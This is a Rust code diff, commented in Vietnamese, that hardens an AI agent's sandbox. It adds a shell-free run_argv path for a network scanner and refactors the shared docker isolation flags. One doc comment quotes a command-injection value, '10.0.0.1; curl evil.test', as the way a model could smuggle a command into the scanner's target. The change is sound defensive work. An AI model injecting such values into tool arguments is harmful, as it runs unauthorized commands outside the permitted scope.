@@ -97,7 +97,11 @@ impl Sandbox {
 
     /// Dựng argv `docker run` cho một lệnh — tách riêng để **unit-test** được mà không
     /// cần docker daemon (kiểm tra đủ cờ bảo mật, không lọt env host).
-    fn docker_run_args(&self, container_name: &str, command: &str) -> Vec<String> {
+    /// Các cờ `docker run` **chung** cho mọi lệnh: cô lập, non-root, giới hạn tài nguyên.
+    ///
+    /// Tách khỏi [`Self::docker_run_args`] để [`Self::run_argv`] dùng lại đúng bộ cờ này mà
+    /// không phải sao chép (tránh tình trạng `run_shell` có cờ an toàn mà scanner thì không).
+    fn docker_run_prefix(&self, container_name: &str) -> Vec<String> {
         let cfg = &self.cfg;
         let mut args: Vec<String> = vec![
             "run".into(),
@@ -128,7 +132,12 @@ impl Sandbox {
             args.push("none".into());
         }
         // KHÔNG có `-e`/`--env-file`: container không nhận biến môi trường của host.
-        args.push(cfg.image.clone());
+        args
+    }
+
+    fn docker_run_args(&self, container_name: &str, command: &str) -> Vec<String> {
+        let mut args = self.docker_run_prefix(container_name);
+        args.push(self.cfg.image.clone());
         // sh -c để thực thi chuỗi lệnh (image chuẩn có /bin/sh — Debian slim, không Node).
         args.push("sh".into());
         args.push("-c".into());
@@ -154,6 +163,49 @@ impl Sandbox {
                 run_docker(args, name, timeout_secs, timeout, cancel).await
             }
             SandboxMode::Host => run_host(command, self.workspace.clone(), timeout, cancel).await,
+        }
+    }
+
+    /// Chạy **argv cố định** (không qua shell) trong sandbox (M23 — scanner).
+    ///
+    /// # Vì sao cần hàm này
+    ///
+    /// [`Self::run`] nhận chuỗi rồi chạy `sh -c`, nghĩa là mọi ký tự `; | & $()` trong
+    /// tham số đều có ý nghĩa với shell. Với scanner đó là lỗ hổng: model chỉ cần truyền
+    /// `target = "10.0.0.1; curl evil.test"` là chạy được lệnh tuỳ ý ngoài phạm vi.
+    ///
+    /// Ở đây argv được **code tự dựng** từ giá trị đã kiểm tra, và container `exec` trực tiếp
+    /// không có shell nào để diễn giải ký tự. Target còn được đặt sau `--` để không bao giờ
+    /// bị parser hiểu nhầm thành tuỳ chọn.
+    ///
+    /// # Errors
+    /// Như [`Self::run`].
+    pub async fn run_argv(
+        &self,
+        argv: &[String],
+        timeout: Duration,
+        cancel: &CancellationToken,
+    ) -> Result<ShellOutcome, SandboxError> {
+        if argv.is_empty() {
+            return Err(SandboxError::Launch("argv rỗng".into()));
+        }
+        match self.cfg.mode {
+            SandboxMode::Docker => {
+                let name = Self::next_container_name();
+                let mut args = self.docker_run_prefix(&name);
+                args.push(self.cfg.image.clone());
+                args.extend_from_slice(argv);
+                let timeout_secs = self.cfg.timeout_seconds;
+                run_docker(args, name, timeout_secs, timeout, cancel).await
+            }
+            SandboxMode::Host => {
+                // Chế độ host: vẫn **exec trực tiếp**, không qua `sh -c` (D14.5).
+                let program = argv[0].clone();
+                let mut command = tokio::process::Command::new(&program);
+                command.args(&argv[1..]);
+                command.current_dir(&self.workspace);
+                run_host_argv(command, timeout, cancel).await
+            }
         }
     }
 }
@@ -324,6 +376,38 @@ async fn run_host(
         res = child.wait_with_output() => {
             let output =
                 res.map_err(|e| SandboxError::Launch(format!("sh lỗi: {e}")))?;
+            Ok(ShellOutcome {
+                exit_code: output.status.code(),
+                stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
+                stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
+            })
+        }
+    }
+}
+
+/// Chế độ host, **exec trực tiếp** argv (không qua `sh -c`) — dùng cho scanner (M23, D14.5).
+///
+/// `command` đã được dựng sẵn ở [`Sandbox::run_argv`], nên không có tầng shell nào diễn giải
+/// ký tự trong tham số.
+async fn run_host_argv(
+    mut command: tokio::process::Command,
+    timeout: Duration,
+    cancel: &CancellationToken,
+) -> Result<ShellOutcome, SandboxError> {
+    let child = command
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .kill_on_drop(true)
+        .spawn()
+        .map_err(|e| SandboxError::Launch(format!("không khởi động được scanner: {e}")))?;
+
+    tokio::select! {
+        biased;
+        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
+        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout.as_secs())),
+        res = child.wait_with_output() => {
+            let output = res.map_err(|e| SandboxError::Launch(format!("scanner lỗi: {e}")))?;
             Ok(ShellOutcome {
                 exit_code: output.status.code(),
                 stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
